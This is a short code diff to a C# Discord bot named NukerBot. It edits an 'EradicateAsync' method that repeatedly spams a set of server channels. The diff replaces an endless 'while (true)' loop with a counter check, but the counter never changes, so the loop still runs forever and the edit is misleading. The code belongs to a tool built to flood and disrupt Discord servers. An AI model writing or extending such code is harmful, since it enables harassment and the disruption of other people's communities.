@@ -1,6 +1,5 @@
-using DSharpPlus;
-using DSharpPlus.CommandsNext;
 using DSharpPlus.Entities;
+using NukerBot.src.Core;
 
 namespace NukerBot.src.Utils;
 
@@ -33,7 +32,8 @@ public static class NukingUtils
     public static Task EradicateAsync(IEnumerable<DiscordChannel> channels, Config config) =>
         Task.Run(async () =>
             {
-                while (true)
+                var count = 500;
+                while (count <= 500)
                 {
                     await SpamChannelsAsync(channels, config);
                 }
